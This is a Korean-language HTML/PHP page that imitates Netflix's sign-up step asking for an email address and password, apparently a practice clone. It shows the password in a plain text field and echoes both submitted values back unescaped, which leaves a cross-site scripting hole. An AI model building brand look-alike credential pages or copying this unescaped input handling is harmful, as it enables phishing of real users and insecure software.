<!DOCTYPE html>
<html>
<head>
    <title>넷플릭스 회원가입</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
    <script src="http://code.jquery.com/jquery-latest.min.js"></script>
</head>
<body>
    <div >
    <img src="img.jpg" alt="logo" width=300px> <p style="position:relative; top:40px; vertical-align: middle; float:right; font-size:30px; font-weight:bold; padding-right:30px;">로그인</p>
    </div>
    <hr>
    <div style="width:650px; position: absolute;left: 50%;transform: translateX(-50%);">
        <br>
        <p style="font-weight:bold; font-size:25px">2/3 단계</p>
        <p style="font-weight:bold; font-size:50px">비밀번호를 설정해 멤버십을 시작하세요.</p>
        <p style="font-size:30px">몇 단계만 거치면 넷플릭스 가입 완료!</p>
        <p style="font-size:30px">복잡한 단계는 모두 없앴습니다.</p>

        <form method = "POST" action="index2.php">
            <div class="mb-3">
            <label for="exampleFormControlInput1" class="form-label"></label>
            <input type="text" name="e-mail" class="form-control form-control-lg" id="exampleFormControlInput1" placeholder="이메일 주소" style="height:100px; font-size:30px;">
            </div>
            <div class="mb-3">
            <label for="exampleFormControlInput1" class="form-label"></label>
            <input type="text" name="password" class="form-control form-control-lg" id="exampleFormControlInput1" placeholder="비밀번호를 추가하세요" style="height:100px; font-size:30px;">
            </div><br>
        
        <div class="form-check">
        <input class="form-check-input" type="checkbox" value="" id="flexCheckDefault" style="-webkit-transform: scale(3);">
        <label class="form-check-label" for="flexCheckDefault" style="font-size:25px;">
        <p style="margin-left:20px;">예, 저는 개인정보 처리방침에 따른 개인정보 수집 및 활용에 동의합니다.</p>
        </label>
        </div>
        <div class="form-check">
        <input class="form-check-input" type="checkbox" value="" id="flexCheckDefault" style="-webkit-transform: scale(3);">
        <label class="form-check-label" for="flexCheckDefault" style="font-size:25px;">
        <p style="margin-left:20px;">예, 넷플릭스 특별 할인 알림 이메일을 보내주세요.(선택사항)</p><br>
        </label>
        <button type="submit" class="btn btn-danger btn-lg" name="submit" style="font-size:40px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;다음&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</button>
        </form>
        </div>

    </div>
    
    <div style="position:fixed; bottom: 0; width:100%; font-size:30px; text-align:left;">
    <?php
        echo "이메일 주소: ".$_POST['e-mail']."<br/>";
        echo "비밀번호: ".$_POST['password']."<br/>";
    ?>
    </div>
</body>
</html>